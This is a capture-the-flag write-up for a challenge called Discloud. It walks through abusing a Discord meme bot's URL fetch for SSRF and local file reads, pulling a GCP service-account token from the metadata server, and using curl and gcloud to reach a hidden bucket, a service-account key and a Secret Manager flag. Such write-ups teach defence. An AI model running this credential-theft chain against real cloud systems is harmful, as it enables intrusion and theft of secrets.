**video solution:** https://youtu.be/oLn6fnCoZ5k

# Discloud

Messaging the MemeSurfer bot on discord it has three main functions list, get and sign. List gets a list of memes, get retrieves a meme either through a name or signed URL, and sign which will sign a URL of a meme to send to a friend.

### SSRF
The vulnerability in this is that when using the command `!meme get -su <URL>` it will go out and request and url you provide (not just signed) and give you its response (SSRF). Not only this but it is also a LFI with `!meme get -su /etc/passwd`. So with this two pieces of knowledge we want to get the source of the bot's code as well as information about the instance it is running on.

### LFI 
Now knowing this is a node application from the description we can assume there is a `package.json` file so we run `!meme get -su package.json` and we receive the outline of the app. We see that 

```
    "start": "node index.js",
```

Is the main entry point, so we do the same thing and get the `index.js` file and everythhing looks as and we don't gain any extra information except a comment on line 25 and 26 that we know where the memes are stored in a bucket called `epic-meme1` but also there is reference to another bucket name!

```
// const memeBucketName = "secure-epic-meme"
const memeBucketName = "epic-meme1"
```

We save this information for next step

### SSRF MetaData server
All GCP instances are in contact with a mother GCP metadata server that can provide a lot of interesting information but most importantly we can get an Oauth access token of the service account running on the VM. So we can use this exploit to retrive more info. Accessing `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token` (beta url does not require the Metadata header to be set) we get access to a token of the form `ya29.c.KmnWByMsRsglySUJKA2JalS...` we can then make requests on behalf of the service account of the VM. 

### Accessing buckets
Now we know that there is a bucket named `epic-meme1` which contains the memes and if we inspect that we will find just 4 normal memes nothing special. But in the LFI there was reference to a secure meme bucket. Lets see if we can go ahead and list those objects in that bucket using [this](https://cloud.google.com/storage/docs/listing-objects) and our token 


```
curl -X GET -H "Authorization: Bearer ya29.c.KmnWByMsRsgl..." \
  "https://storage.googleapis.com/storage/v1/b/secure-epic-meme/o"

<snip>
        selfLink": "https://www.googleapis.com/storage/v1/b/secure-epic-meme/o/epic.jpg",
      "mediaLink": "https://storage.googleapis.com/download/storage/v1/b/secure-epic-meme/o/epic.jpg?generation=1596196069167950&alt=media",
      "name": "epic.jpg",
      "bucket": "secure-epic-meme",
</snip>
```

and bingo we get an object listing with an object called `epic.jpg` so lets pull that and see what it contains

```
curl -X GET -H "Authorization: Bearer $OAUTH2_TOKEN" https://storage.googleapis.com/download/storage/v1/b/secure-epic-meme/o/epic.jpg?generation=1596196069167950&alt=media 
```                             
 And we get a big base64 output:
 ```
 ewogICJ0eXBlIjo.....
 ```

 Lets unbase64 this and see what it is 
 
 ```
 {
  "type": "service_account",
  "project_id": "discloud-meme",
  "private_key_id": "1186bb89be47d7cc8c28abfc2090bd18bb1c5f77",
  "private_key": "<snip></snip>",
  "client_email": "secret-manager@discloud-meme.iam.gserviceaccount.com",
  "client_id": "109460679507899502660",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/secret-manager%40discloud-meme.iam.gserviceaccount.com"
}
```

Nice so we found some account key credentials for the secret-manager service account, this sounds like it is getting closer to the secrets the challeneg was talking about. Saving this key to a file called secret.json. Now we can use it to login to the gcloud command line.

```
gcloud auth activate-service-account --key-file /path/to/secret.json
```

Great now once we are logged in lets find out what secrets the challenge is talking about when googlging `gcp secrets` [this link](https://cloud.google.com/solutions/secrets-management) should come up about secret manager. 

Lets see if we can try and list the secrets with `gcloud secrets list`
```
NAME        CREATED              REPLICATION_POLICY  LOCATIONS
big_secret  2020-07-31T11:51:46  automatic           -
```

Fantastic, looks like there is a secret called `big_secret` now lets try and access it again referecing the API
```
gcloud secrets versions access latest --secret big_secret
```

and out pops the flag!



## Flag:

```
DUCTF{bot_boi_2_cloud_secrets}
```
